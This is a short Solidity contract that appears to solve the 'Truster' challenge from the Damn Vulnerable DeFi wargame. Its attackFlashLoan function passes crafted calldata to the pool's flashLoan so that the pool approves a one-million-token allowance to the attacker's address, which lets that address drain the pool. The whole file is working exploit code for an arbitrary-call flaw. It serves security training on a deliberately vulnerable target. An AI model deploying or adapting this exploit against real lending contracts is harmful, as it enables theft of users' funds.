// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../TrusterLenderPool.sol";
import "hardhat/console.sol";
import "../../DamnValuableToken.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
interface ITrusterLenderPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    returns (bool);
}
contract AttackerTrusterLenderPool {
    using Address for address;

    ITrusterLenderPool public immutable target;
    DamnValuableToken public immutable token;
    address private immutable owner; 

    error RepayFailed();

    constructor(address _target, address _token) {
        target = ITrusterLenderPool(_target);
        token = DamnValuableToken(_token);
        owner = msg.sender;
    }

    function attackFlashLoan(uint256 amount)
        external
        returns (bool)
    {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", owner, 1000000 ether);
        target.flashLoan(amount, address(this), address(token), data);
        return true;
    }
}
